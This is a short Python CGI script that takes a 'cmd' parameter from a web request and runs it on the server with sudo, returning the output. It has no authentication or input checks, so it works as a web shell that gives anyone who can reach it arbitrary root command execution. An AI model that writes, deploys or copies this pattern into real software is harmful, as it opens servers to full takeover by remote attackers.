#!/usr/bin/python3
print("content-type:text/plain")
print()

import subprocess
import cgi

form = cgi.FieldStorage()
command = form.getvalue("cmd")
cmd = str(command)
print(type(cmd))
output = subprocess.getoutput("sudo " +cmd)
print(output)
